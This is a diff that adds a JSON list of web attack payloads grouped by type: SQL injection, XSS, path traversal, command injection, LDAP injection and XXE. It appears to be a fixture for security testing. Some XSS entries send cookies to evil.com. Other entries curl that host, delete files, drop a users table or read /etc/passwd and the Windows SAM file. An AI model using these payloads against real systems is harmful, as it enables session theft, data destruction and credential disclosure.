@@ -1,0 +1,61 @@
+{
+  "sql_injection": [
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "admin'--",
+    "' UNION SELECT NULL--",
+    "1' AND '1'='1",
+    "'; DROP TABLE users--",
+    "1' ORDER BY 1--",
+    "' OR 'a'='a",
+    "1' AND SLEEP(5)--",
+    "' UNION ALL SELECT NULL,NULL--",
+    "-1' UNION SELECT 1,2,3--",
+    "1' AND extractvalue(1,concat(0x7e,version()))--",
+    "' OR EXISTS(SELECT * FROM users)--",
+    "1' AND (SELECT COUNT(*) FROM users)>0--"
+  ],
+  "xss_attacks": [
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg/onload=alert('XSS')>",
+    "javascript:alert(document.cookie)",
+    "<iframe src='javascript:alert(1)'>",
+    "<body onload=alert('XSS')>",
+    "<img src=x onerror=\"fetch('http://evil.com?c='+document.cookie)\">",
+    "<script>document.write('<img src=//evil.com?c='+document.cookie+'>')</script>",
+    "<svg><script>alert&#40;1&#41;</script>",
+    "<input autofocus onfocus=alert(1)>"
+  ],
+  "path_traversal": [
+    "../../../etc/passwd",
+    "..\\..\\..\\windows\\system32\\config\\sam",
+    "....//....//....//etc/passwd",
+    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "..%252f..%252f..%252fetc%252fpasswd",
+    "....\\....\\....\\windows\\win.ini"
+  ],
+  "command_injection": [
+    "; ls -la",
+    "| cat /etc/passwd",
+    "&& whoami",
+    "` rm -rf /tmp/* `",
+    "; ping -c 10 127.0.0.1",
+    "|| id",
+    "`uname -a`",
+    "; curl http://evil.com"
+  ],
+  "ldap_injection": [
+    "*",
+    "admin*",
+    "*)(uid=*",
+    "admin)(&)",
+    "*()|&'",
+    "*)(objectClass=*",
+    "admin)(|(password=*))"
+  ],
+  "xml_injection": [
+    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
+    "<![CDATA[<script>alert('XSS')</script>]]>"
+  ]
+}
